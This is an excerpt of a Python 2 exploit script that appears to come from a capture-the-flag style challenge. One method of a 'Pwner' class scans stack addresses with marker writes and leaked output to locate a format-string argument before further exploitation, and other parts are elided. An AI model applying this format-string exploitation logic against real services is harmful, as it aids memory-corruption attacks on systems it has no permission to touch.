...
class Pwner (object):
    ...
    def exploit (self):
        ...
        # logic to automatically find arg address
        print '[+] Looking for our format string leaker address location'
        addr_cur = self.addr_stack + 0x2600 + 760 * 8
        addr_max = (self.addr_stack & ~0xfff) + 0x1000 * 6

        print 'addr_cur         : %x' % addr_cur
        print 'addr_max         : %x' % addr_max

        self.addr_arg = None
        while addr_cur < addr_max:
            packed = struct.pack ('<Q', addr_cur)
            if '\x0a' in packed:
                addr_cur += 8
                continue
            self.write16 (addr_cur, 0xdeadbeefdeadbeef, 0xcafebabecafebabe)
            recv_all (self.target)
            ...
            n_iter = (addr_cur - self.addr_stack) / 8

            #print 'leaked %04d : %s (addr : 0x%x)' % (n_iter, leaked, addr_cur)

            if 'deadbeefdeadbeef' in leaked:
                print 'Found addr_arg   : %x' % addr_cur
                self.addr_arg = addr_cur
                break

            addr_cur += 8

        if self.addr_arg == None:
            print "[-] Exploit failed : Couldn't find format string argument address"
            exit (1)

        # now go on exploitation
